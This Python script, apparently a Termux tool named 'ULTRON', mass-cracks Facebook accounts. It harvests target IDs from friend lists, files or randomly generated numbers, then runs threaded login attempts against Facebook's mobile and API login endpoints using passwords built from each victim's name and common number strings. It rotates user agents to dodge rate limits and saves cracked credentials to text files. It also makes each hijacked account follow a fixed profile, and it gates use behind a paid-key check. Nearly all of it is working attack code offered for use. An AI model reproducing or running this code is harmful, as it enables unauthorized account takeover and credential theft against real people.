import os
try:
	import requests
except ImportError:
	os.system("pip install requests")

try:
	import concurrent.futures
except ImportError:
	os.system("pip install futures")

import os
import sys
import time
import requests
import random
import platform
import base64
import subprocess
from concurrent.futures import ThreadPoolExecutor
import requests,bs4,uuid,json,os,sys,random,datetime,time,re,subprocess
try:
	import rich
except ImportError:
	os.system('pip install rich')
	time.sleep(1)
	try:
		import rich
	except ImportError:
		exit(' [×] Cant Install Rich Module, Try Manual Install (pip install rich)')
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
import base64
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from urllib.parse import quote
# UA LIST
#ugen2=open('frec.txt','r').read().splitlines()
#ugen=open('m.txt','r').read().splitlines()
ugen2=[
    'Mozilla/5.0 (Android 2.2; id-id; HTC Desire)/GoBrowser',
    'Mozilla/5.0 (Linux; U; Android 4.0.4; de-de; SonyEricssonMT11i Build/Xperia Ultimate HD™ 3.0.2) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
    'Mozilla/5.0 (Linux; Android 4.1.2; GT-I8730T Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36 OPR/50.6.2426.201126',
    'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36'
    ]
ugen=[
    "Mozilla/5.0 (Linux; Android 12; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-S908U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.1; OPPO F1 Plus Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; M2101K7BG Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36",
    'Mozilla/5.0 (Linux; Android 11; LM-K500) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.129 Mobile Safari/537.36'
    ]
# INDICATION
id,id2,loop,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,[],[],[],[],[],[],[],[]
cp = 0
ok = []
try:
	os.mkdir('/sdcard/')
except:pass
# COLORS
R = '\033[31;1m'
G = '\033[32;1m'
Y = '\033[33;1m'
B = '\033[34;1m'
M = '\033[35;1m'
C = '\033[36;1m'
LR = '\033[91;1m'
LG = '\033[92;1m'
LY = '\033[93;1m'
LB = '\033[94;1m'
LM = '\033[95;1m'
LC = '\033[96;1m'
dc = random.choice([R,G,Y,B,M,C,LR,LG,LY,LB,LM])

# Converter 
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'Agustus','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'Agustus','09':'September','10':'October','11':'November','12':'December'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

def xox(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.04)
# CLEAR
def clear():
	os.system('clear')
# BACK
def back():
	login()

def login():
	try:
		token = open('.token.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?access_token='+tokenku[0])
			public_menu()
		except KeyError:
			Public()
		except requests.exceptions.ConnectionError:
			clear()
			print(logo)
			print ( ' [×] Connection Timeout')
			exit()
	except IOError:
		Public()
def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
############### #LOGO############## ## 

# LOGIN
def Public():
	clear()
	print(logo)
	print  (' [01] Login With Token\n [02] Login With Cookie')
	pil=input('\n [#] Select One : ')
	if pil in ['1','01']:
		panda = input(' [+] Token : ')
		akun=open('.token.txt','w').write(panda)
		try:
			tes = requests.get('https://graph.facebook.com/me?access_token='+panda)
			tes3 = json.loads(tes.text)['id']
			print (" [] Login Successful")
			login()
		except KeyError:
			print( ' [×] Login Failed ')
			time.sleep(2.5)
			Public()
		except requests.exceptions.ConnectionError:
			print ( ' [×] Connection Timeout')
			exit()
	elif pil in ['2','02']:
		try:
			cookie=input(" [+] Cookie : ")
			data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 12.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
			find_token = re.search("(EAAG\w+)", data.text)
			ken=open(".token.txt", "w").write(find_token.group(1))
			print (" [] Login Successful")
			login()
		except Exception as e: 
			os.system("rm -f .token.txt")
			print( ' [×] Login Failed ')
			time.sleep(2.5)
			login()
			exit()
			
			
def public_menu():
	try:
		token = open('.token.txt','r').read()
	except IOError:
		exit()
	clear()
	print(logo)
	pil = input('\n [+] Enter ID Target : ')
	try:
		koh2 = requests.get('https://graph.facebook.com/v2.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0]).json()
		for pi in koh2['friends']['data']:
			id.append(pi['id']+'|'+pi['name'])
		print(' [] Total : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print (' [#] Connection Time Out')
		exit()
	except (KeyError,IOError):
		print(' [!] Not public Or Token Expire')
		exit()
		
		
def File():
			clear()
			print(logo)
			try:
				fileX = input ('\033[34;1m\n [+] Enter file path : \033[92;1m') 
				for line in open(fileX, 'r').readlines():
					id.append(line.strip())
				setting()
			except IOError:
				print("\n [!] file %s not found"%(fileX))
				time.sleep(1.5)
				Main()
				

def setting():
	hu = ("2")
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print (' [!] Choose Correct Option')
		exit()
	clear()
	print(logo)
	print ('\033[93;1m [01] METHOD 1 ')
	print ('\033[93;1m [02] METHOD 2 ')
	print("\033[90;1m [0] BACK \n")
	hc = input ("\033[34;1m [#] method : \033[92;1m")
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['2','02']:
		method.append('free')
	elif hc in ['0']:
	    Main()
	else:
		method.append('mobile')
	passmenu()
	
	
def passmenu():
	clear()
	print(logo);
	print ('\033[93;1m [01] PASSWORD 1 ')
	print ('\033[93;1m [02] PASSWORD 2 ')
	print("\033[90;1m [0] BACK \n")
	passmen=input('\033[34;1m [#] Select : \033[92;1m')
	if passmen in ['1','01']:
		pass1()
	elif passmen in ['2','02']:
		pass2()
	elif passmen in ['0']:
	    setting()
	else:
		passmenu()
		
		
def pass1():
	clear()
	print(logo);
	print( ' [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			try:
				idf,nmf = yuzong.split('|')
				xz = nmf.split(' ')
				pwv = [nmf, xz[0]+xz[1], xz[0]+"12", xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[1]+"12", xz[1]+"123", xz[1]+"1234", xz[1]+"12345", "102030", "556677", "223344", "123456"]
				if 'mobile' in method:
					pool.submit(crack,idf,pwv)
				elif 'free' in method:
					pool.submit(free,idf,pwv)
				else:
					pool.submit(crack,idf,pwv)
			except:
				pass
				
				
def pass2():
	clear()
	print(logo);
	print( ' [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			try:
				idf,nmf = yuzong.split('|')
				xz = nmf.split(' ')
				pwv = [nmf, xz[0]+xz[1], xz[0]+"12", xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[1]+"12", xz[1]+"123", xz[1]+"1234", xz[1]+"12345", "102030", "556677", "223344", "123456"]
				if 'mobile' in method:
					pool.submit(crack,idf,pwv)
				elif 'free' in method:
					pool.submit(free,idf,pwv)
				else:
					pool.submit(crack,idf,pwv)
			except:
				pass
				
			
# CRACKER
def crack(idf,pwv):
	global loop,ok,cp
	dc = random.choice([R,G,Y,B,M,C,LR,LG,LY,LB,LM])
	pers = loop*100/len(id2)
	fff = '%'
	sys.stdout.write('\r %s[ Cracking ] %s•%s • OK:%s • CP:%s  '%(dc,loop,len(id2),len(ok),cp)),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			pw = pw.lower()
			ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=en_US&_rdr').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://mbasic.facebook.com/login/save-device/'"}
			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=en_US&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=en_US',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				cp +=1
				print( f'\r\x1b[1;91m [ CHECKPOINT ] {idf} | {pw}')
				open('cp.txt', 'a').write(idf+' | '+pw+'\n')
				akun.append(idf+'|'+pw)
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				coki=po.cookies.get_dict()
				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r\x1b[1;92m [ EXCELLENT ] {idf} | {pw}')
				wrt =('%s - %s' % (idf,pw))
				ok.append(wrt)
				open('ok.txt', 'a').write(idf+' | '+pw+'\n')
				follow(ses,coki)
				break

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
def free(idf,pwv):
	global loop,ok,cp
	dc = random.choice([R,G,Y,B,M,C,LR,LG,LY,LB,LM])
	pers = loop*100/len(id2)
	fff = '%'
	sys.stdout.write('\r %s[ Cracking ] %s•%s • OK:%s • CP:%s  '%(dc,loop,len(id2),len(ok),cp)),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			pw = pw.lower()
			ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=en_US&_rdr').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://mbasic.facebook.com/login/save-device/'"}
			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=en_US&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=en_US',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				cp +=1
				print( f'\r\x1b[1;91m [ CHECKPOINT ] {idf} | {pw}')
				open('cp.txt', 'a').write(idf+' | '+pw+'\n')
				akun.append(idf+'|'+pw)
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				coki=po.cookies.get_dict()
				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r\x1b[1;92m [ EXCELLENT ] {idf} | {pw}')
				wrt =('%s - %s' % (idf,pw))
				ok.append(wrt)
				open('ok.txt', 'a').write(idf+' | '+pw+'\n')
				follow(ses,coki)
				break

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
def follow(ses,coki):
	ses.headers.update({"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100067945261995', cookies={'cookie': coki}).text, 'html.parser')
	get = r.find('a', string='Follow').get('href')
	ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text

logo = ("""\033[1;36m
       
8888888b.  8888888b.  8888888888 Y88b   d88P 
888  "Y88b 888   Y88b 888         Y88b d88P  
888    888 888    888 888          Y88o88P   
888    888 888   d88P 8888888       Y888P    
888    888 8888888P"  888           d888b    
888    888 888 T88b   888          d88888b   
888  .d88P 888  T88b  888         d88P Y88b  
8888888P"  888   T88b 8888888888 d88P   Y88b            
          \n%s    ╔═════════════════════════════╗\n%s    ║  TOOL NAME: {  ULTRON  }    ║\n%s    ║  AUTHOR   : CHIDEXZY        ║\n%s    ╚═════════════════════════════╝
          \n"""%(dc,dc,dc,dc))

class Main:
	def __init__(self):
		self.id = []
		self.ok = []
		self.cp = []
		self.loop = 0
		os.system("clear")
		print(logo)
		print("\033[92;1m [1] FILE CLONING")
		print("\033[96;1m [2] VIEW AND SAVE RESULTS")
		print("\033[93;1m [3] UPDATE TOOL 01.00")
		print("\033[90;1m [0] EXIT \n")
		select =input("\033[34;1m Choose : \033[92;1m")
		if select in ["1", "01"]:
			File()
		if select in ["0"]:
			exit()
		else:
			print (" Select Correctly ")
			time.sleep(1.5)
			Main()

	def old(self):
		x = 111111111
		xx = 999999999
		idx = "100000" 
		os.system('clear');print(logo)
		limit = int(input(" \n\033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50,000: "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n\033[1;32m [!] USE (123456) FOR IDZ\033[1;37m ")
				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
				os.system("clear")
				print(logo)
				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(Y))
				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(G))
				print("%s [!] IF NO RESULT USE AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(P))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n [>>] CRACK COMPLETE...")
		except Exception as e:exit(str(e))

	def api(self, uid, pwx):
		rua = random.choice([
			"Mozilla/5.0 (Linux; Android 10; Mi A3 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/333.0.0.30.119;]"
  "Mozilla/5.0 (Linux; Android 9; SM-N960U Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/379.0.0.24.109;]"
  "Mozilla/5.0 (Linux; Android 8.0.0; SM-G930F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.110 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/377.0.0.22.107;]"
		])
		sys.stdout.write(
			"\r [ CEY4B ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			headers = {
				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
				"x-fb-net-hni": str(random.randint(20000, 40000)), 
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent": rua, 
				"content-type": "application/x-www-form-urlencoded", 
				"x-fb-http-engine": "Liger"
			}
			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[ CEY4B-OK ] %s | %s\033[0;97m         "%(uid, pw))
				print ("\r \033[0;92m Congrats Bro ")
				self.ok.append("%s|%s"%(uid, pw))
				open("2009-ANMOL-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;92m[ CEY4B-OK ] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("2009-CEY4B-OK.txt","a").write(" %s | %s\n"%(uid, pw))
				break
			else:
				continue

		self.loop +=1

	def old2(self):
		x = 1111111111
		xx = 9999999999
		idx = "10000" 
		os.system('clear');print(logo)
		limit = int(input("\n \033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50,000: "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n\033[1;32m [!] USE (123456) FOR IDZ\033[1;37m ")
				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
				os.system("clear")
				print(logo)
				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(Y))
				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(G))
				print("%s [!] IF NO RESULT USE AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(P))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n [>>] CRACK COMPLETE...")
		except Exception as e:exit(str(e))

	def api(self, uid, pwx):
		rua = random.choice([
			"Mozilla/5.0 (Linux; Android 10; Mi A3 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/333.0.0.30.119;]"
  "Mozilla/5.0 (Linux; Android 9; SM-N960U Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/379.0.0.24.109;]"
  "Mozilla/5.0 (Linux; Android 8.0.0; SM-G930F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.110 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/377.0.0.22.107;]"
		])
		sys.stdout.write(
			"\r [ CEY4B ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			headers = {
				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
				"x-fb-net-hni": str(random.randint(20000, 40000)), 
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent": rua, 
				"content-type": "application/x-www-form-urlencoded", 
				"x-fb-http-engine": "Liger"
			}
			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[ CEY4B-OK ] %s | %s\033[0;97m         "%(uid, pw))
				print ("\r \033[0;92m Congrats Bro ")
				self.ok.append("%s|%s"%(uid, pw))
				open("2009-ANMOL-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;92m[ CEY4B-OK ] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("2009-CEY4B-OK.txt","a").write(" %s | %s\n"%(uid, pw))
				break
			else:
				continue

		self.loop +=1

def Subscraption():
	key1=open('/data/data/com.termux/files/usr/bin/.mrahsan-cov', 'r').read()
	clear()
	print(logo)
	r1=requests.get("https://pastebin.com/p3jbWM14").text
	if key1 in r1:
		os.system('clear')
		print(logo)
		Main()
	else:
		os.system("clear")
		print(logo)
		print("\t \033[1;32m First Get Approvel\033[1;37m ")
		time.sleep(1)
		os.system("clear")
		print(logo)
		print ("")
		print(" \033[1;32m CEYAB Toll Paid You Need Get Approved First\033[1;37m\n")
		print(" \033[1;32m Note : Paid Tolls Free  HA JANI LOG \033[1;37m")
		print ("")
		print(" Your Key is Not Approved ")
		print("")
		print(" Copy And Send Key To Admin")
		print ("")
		print (" Your Key : "+ak+ahsan+key1)
		print ("")
		name = input(" Your Name : ")
		print ("")
		input(" Press Enter To Send Key")
		time.sleep(3.5)
		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+ahsan+''+key1
		os.system('am start https://wa.me/+923435734643?text=' + tks)
		Subscraption()        
Main()
